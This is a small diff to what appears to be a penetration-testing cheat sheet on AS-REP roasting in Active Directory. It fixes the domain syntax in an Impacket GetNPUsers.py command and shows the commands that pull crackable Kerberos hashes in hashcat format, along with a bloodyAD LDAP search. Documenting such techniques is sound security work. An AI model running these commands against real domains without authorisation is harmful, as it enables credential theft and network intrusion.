@@ -30,7 +30,7 @@ bloodyAD -u <USER> -p 'PASSWORD' -d <DOMAIN> --host <IP> get search --filter '(&
 **Linux**
 ```bash
 # Try all the usernames the file provided
-python GetNPUsers.py <DOMAIN> -usersfile <USER_FILE> -format hashcat -outputfile <HASHES_OUT>
+python GetNPUsers.py <DOMAIN>/ -usersfile <USER_FILE> -format hashcat -outputfile <HASHES_OUT>
 # Use domain creds to extract targets and target them
 python GetNPUsers.py <DOMAIN>/USER:PASSWORD -request -format hashcat -outputfile <HASHES_OUT>
 ```
